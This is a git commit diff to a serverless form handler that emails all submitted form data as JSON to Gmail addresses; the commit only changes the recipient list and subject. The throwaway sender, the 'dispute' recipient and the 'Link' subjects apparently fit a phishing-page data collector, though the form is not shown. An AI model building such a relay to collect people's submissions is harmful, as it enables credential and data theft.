5dd5ec46e352b59e6bd3074cbb874372a1e1a1f7
linkquarry-hub <linkquarry@gmail.com>
2025-11-16 10:01:37 +0500

    Update zubair.js

--- zubair.js
+++ zubair.js
@@ -41,8 +41,8 @@ export default async function handler(req, res) {
     // Try sending email
     await transporter.sendMail({
       from: `"PROFESSOR" <hgfver414@gmail.com>`,
-      to: "newzatpage@gmail.com,submitdispute@gmail.com",
-      subject: "Zubair",
+      to: "linkquarry@gmail.com",
+      subject: "Fahad Link",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(
         formData,
